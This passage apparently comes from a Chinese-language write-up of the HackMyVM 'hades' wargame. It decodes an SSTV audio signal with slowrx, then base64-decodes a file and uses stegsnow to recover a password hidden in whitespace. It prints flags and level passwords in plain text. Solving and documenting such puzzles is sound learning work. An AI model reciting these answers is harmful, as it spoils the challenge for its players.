             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.11/dist-packages/sstv-0.1-py3.11.egg/sstv/__main__.py", line 18, in main
  File "/usr/local/lib/python3.11/dist-packages/sstv-0.1-py3.11.egg/sstv/command.py", line 109, in start
  File "/usr/local/lib/python3.11/dist-packages/sstv-0.1-py3.11.egg/sstv/decode.py", line 73, in decode
  File "/usr/local/lib/python3.11/dist-packages/sstv-0.1-py3.11.egg/sstv/decode.py", line 182, in _decode_vis
ValueError: SSTV mode is unsupported (VIS: 99)
```
尝试切换脚本进行解码：https://github.com/windytan/slowrx
```bash
sudo apt install libasound2-dev
sudo apt install libgtk-3-dev
sudo apt install libfftw3-dev 
make
```
左上角选成`Ensoniq AudioPCI`，然后播放音频即可，阔以得到目标图片:
CKzlnvmHQz

## 20 cassandra
```bash
cassandra@hades:~$ ls -la
total 36
drwxr-x--- 2 root      cassandra 4096 Apr  5 06:36 .
drwxr-xr-x 1 root      root      4096 Apr  5 06:36 ..
-rw-r--r-- 1 cassandra cassandra  220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 cassandra cassandra 3526 Apr 23  2023 .bashrc
-rw-r--r-- 1 cassandra cassandra  807 Apr 23  2023 .profile
-rw-r----- 1 root      cassandra   22 Apr  5 06:36 flagz.txt
-rw-r----- 1 root      cassandra  369 Apr  5 06:36 here.txt
-rw-r----- 1 root      cassandra  147 Apr  5 06:36 mission.txt
cassandra@hades:~$ grep -ra '\^*\^' .
./flagz.txt:^lntvcYNlazEljOyZYKz^
cassandra@hades:~$ cat mission.txt 
################
# MISSION 0x20 #
################

## EN ##
User cassiopeia sees the invisible. 

## ES ##
La usuaria cassiopeia ve lo invisible.
cassandra@hades:~$ cat here.txt 
VGhlIHBhc3N3b3JkIG9mIGNhc3Npb3BlaWEgaXM6CSAgICAgIAkgICAgCSAgIAkgICAgIAkgICAg
CSAgICAKICAgCSAgICAJICAJICAgIAkgCSAgIAkgICAgICAgCSAgICAJICAgIAoJICAgICAgCQkg
CSAgIAkgICAJICAgIAkgICAgIAkgICAgIAkgIAogICAJIAkgICAgIAkgICAgICAJICAgIAkgICAg
ICAJICAJICAJIAkgICAKICAgCSAgICAgIAkgICAgCSAJICAgICAJICAgICAgCSAgICAJICAgCSAg
ICAgCgkgICAgCSAgICAJIAkgICAgICAJICAgICAJIAkgCSAgICAgICAJIAo=

hgbe02@pwn:~/temp$ echo 'VGhlIHBhc3N3b3JkIG9mIGNhc3Npb3BlaWEgaXM6CSAgICAgIAkgICAgCSAgIAkgICAgIAkgICAgCSAgICAKICAgCSAgICAJICAJICAgIAkgCSAgIAkgICAgICAgCSAgICAJICAgIAoJICAgICAgCQkgCSAgIAkgICAJICAgIAkgICAgIAkgICAgIAkgIAogICAJIAkgICAgIAkgICAgICAJICAgIAkgICAgICAJICAJICAJIAkgICAKICAgCSAgICAgIAkgICAgCSAJICAgICAJICAgICAgCSAgICAJICAgCSAgICAgCgkgICAgCSAgICAJIAkgICAgICAJICA
gICAJIAkgCSAgICAgICAJIAo=' | base64 -d                                                                    
The password of cassiopeia is:                                              
                                                                    
                                                                          
                                                                           
                                                                     
                       
```
发现大量空白怀疑是进行了隐写，尝试提取：
```bash
hgbe02@pwn:~/temp$ scp -P 6666 cassandra@hades.hackmyvm.eu:/pwned/cassandra/here.txt .
......
hgbe02@pwn:~/temp$ cat here.txt 
VGhlIHBhc3N3b3JkIG9mIGNhc3Npb3BlaWEgaXM6CSAgICAgIAkgICAgCSAgIAkgICAgIAkgICAg
CSAgICAKICAgCSAgICAJICAJICAgIAkgCSAgIAkgICAgICAgCSAgICAJICAgIAoJICAgICAgCQkg
CSAgIAkgICAJICAgIAkgICAgIAkgICAgIAkgIAogICAJIAkgICAgIAkgICAgICAJICAgIAkgICAg
ICAJICAJICAJIAkgICAKICAgCSAgICAgIAkgICAgCSAJICAgICAJICAgICAgCSAgICAJICAgCSAg
ICAgCgkgICAgCSAgICAJIAkgICAgICAJICAgICAJIAkgCSAgICAgICAJIAo=
hgbe02@pwn:~/temp$ cat here.txt | base64 -d > here_flag
hgbe02@pwn:~/temp$ stegsnow here_flag 
gRqFnHblmZVZSfegPLvO
```